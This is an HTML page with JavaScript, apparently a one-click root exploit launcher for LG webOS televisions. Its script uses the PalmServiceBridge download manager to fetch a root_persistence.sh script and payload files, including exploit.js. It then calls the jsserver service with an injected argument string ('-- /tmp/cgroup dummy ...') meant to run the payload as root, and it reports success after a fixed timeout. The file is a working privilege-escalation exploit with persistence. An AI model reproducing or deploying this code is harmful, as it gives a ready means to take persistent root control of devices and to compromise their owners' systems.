<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>jsbro</title>
  <style>
    html, body {
      margin: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #050505;
      color: #f2efe8;
      font-family: sans-serif;
    }

    body {
      display: flex;
      align-items: center;
      justify-content: center;
    }

    main {
      min-width: 320px;
      max-width: 80vw;
      padding: 24px 28px;
      border: 1px solid #303030;
      border-radius: 12px;
      background: #101010;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
      text-align: center;
    }

    .label {
      margin: 0 0 10px;
      font-size: 14px;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      color: #9f9f9f;
    }

    .state {
      margin: 0;
      font-size: 34px;
      font-weight: 700;
    }

    .pending { color: #f4c95d; }
    .success { color: #64d98b; }
    .failed { color: #ff7878; }

    .detail {
      margin: 14px 0 0;
      font-size: 15px;
      color: #cecece;
      word-break: break-word;
    }

  </style>
</head>
<body>
  <main>
    <p class="label">Jsbro</p>
    <p id="state" class="state pending">pending</p>
    <p id="detail" class="detail">starting download...</p>
  </main>
  <script>
    var stateEl = document.getElementById('state');
    var detailEl = document.getElementById('detail');
    var scriptPath = '/media/internal/downloads/root_persistence.sh';
    var downloadTarget = new URL('../root_persistence.sh', window.location.href).toString();
    var debugMode = new URLSearchParams(window.location.search).has('debug');

    function setState(name, detail) {
      stateEl.textContent = name;
      stateEl.className = 'state ' + name;
      detailEl.textContent = detail || '';
    }

    function failStep(step, detail) {
      setState('failed', step + ': ' + (detail || 'unknown failure'));
    }

    function isObject(value) {
      return value !== null && typeof value === 'object';
    }

    function parse(payload) {
      if (typeof payload !== 'string') return payload;
      try {
        return JSON.parse(payload);
      } catch (_) {
        return payload;
      }
    }

    function runRootExploit() {
      setState('pending', 'preparing root execution...');

      var payloadBase = new URL('./payload/', window.location.href).toString();
      var files = [
        { name: 'package.json', url: payloadBase + 'package.json' },
        { name: 'services.json', url: payloadBase + 'services.json' },
        { name: 'exploit.js', url: payloadBase + 'exploit.js' }
      ];
      var written = 0;
      var targetDir = '/media/internal/downloads';

      function onAllWritten() {
        setState('pending', 'triggering root execution...');
        var bridge = new window.PalmServiceBridge();
        bridge.onservicecallback = function(payload) {
          var parsed = parse(payload);
          if (isObject(parsed) && parsed.returnValue === false) {
            failStep('jsserver', parsed.errorText || 'jsserver call failed');
          }
        };
        bridge.call('luna://com.webos.service.jsserver/run',
          JSON.stringify({"inputParams": "-- /tmp/cgroup dummy " + targetDir}));

        setState('pending', 'root exploit running. Watch your TV for the result...');
        var attempts = 0;
        var poll = setInterval(function() {
          attempts++;
          if (attempts > 45) {
            clearInterval(poll);
            setState('success', 'root exploit complete! Reboot TV to activate persistent root.');
          }
        }, 2000);
      }

      function downloadFile(file) {
        var b = new window.PalmServiceBridge();
        b.onservicecallback = function(payload) {
          var parsed = parse(payload);
          if (!isObject(parsed)) return;
          if (parsed.ticket) {
            var b2 = new window.PalmServiceBridge();
            b2.onservicecallback = function(p2) {
              var r = parse(p2);
              if (!isObject(r)) return;
              if (r.completed === true && !r.aborted && !r.interrupted) {
                written++;
                if (written === files.length) onAllWritten();
              } else if (r.aborted || r.interrupted || r.state === 'failed') {
                failStep('payload download', file.name + ': ' + (r.errorText || 'failed'));
              }
            };
            b2.call('luna://com.webos.service.downloadmanager/downloadStatusQuery',
              JSON.stringify({ ticket: parsed.ticket, subscribe: true }));
          } else if (parsed.returnValue === false) {
            failStep('payload download', file.name + ': ' + (parsed.errorText || 'request failed'));
          }
        };
        b.call('luna://com.webos.service.downloadmanager/download',
          JSON.stringify({
            target: file.url,
            targetDir: targetDir,
            targetFilename: file.name,
            subscribe: false
          }));
      }

      files.forEach(downloadFile);
    }

    function watchDownload(ticket) {
      var settled = false;
      var bridge = new window.PalmServiceBridge();
      bridge.onservicecallback = function (payload) {
        if (settled) return;
        var parsed = parse(payload);
        if (!isObject(parsed)) {
          settled = true;
          failStep('download status query', 'status query returned an invalid payload');
          return;
        }
        if (parsed.returnValue === false) {
          settled = true;
          failStep('download status query parse', parsed.errorText || 'status query failed');
          return;
        }
        if (parsed.completed === true && parsed.aborted !== true && parsed.interrupted !== true) {
          settled = true;
          runRootExploit();
          return;
        }
        if (parsed.aborted === true || parsed.interrupted === true || parsed.state === 'failed') {
          settled = true;
          failStep('download status query flag', parsed.errorText || 'download failed');
          return;
        }
        if (typeof parsed.amountReceived !== 'undefined' && typeof parsed.amountTotal !== 'undefined') {
          setState('pending', 'downloading... ' + parsed.amountReceived + ' / ' + parsed.amountTotal + ' bytes');
          return;
        }
        if (typeof parsed.target === 'string' || typeof parsed.state === 'string') {
          setState('pending', parsed.target || parsed.state || 'downloading...');
          return;
        }
        settled = true;
        failStep('download status query', 'status query returned an unexpected payload');
      };
      bridge.call(
        'luna://com.webos.service.downloadmanager/downloadStatusQuery',
        JSON.stringify({ ticket: ticket, subscribe: true })
      );
    }

    if (typeof window.PalmServiceBridge === 'undefined') {
      failStep('bootstrap', 'PalmServiceBridge is not available');
    } else {
      var bridge = new window.PalmServiceBridge();
      bridge.onservicecallback = function (payload) {
        var parsed = parse(payload);
        if (!isObject(parsed)) {
          failStep('download request', 'download request returned an empty payload');
          return;
        }
        if (parsed.ticket) {
          setState('pending', 'download accepted');
          watchDownload(parsed.ticket);
          return;
        }
        if (parsed.returnValue === false) {
          failStep('download request', parsed.errorText || 'download request failed');
          return;
        }
        failStep('download request', 'download request returned an unexpected payload');
      };
      bridge.call(
        'luna://com.webos.service.downloadmanager/download',
        JSON.stringify({
          target: downloadTarget,
          targetDir: '/media/internal/downloads',
          targetFilename: 'root_persistence.sh',
          subscribe: false
        })
      );
    }
  </script>
</body>
</html>
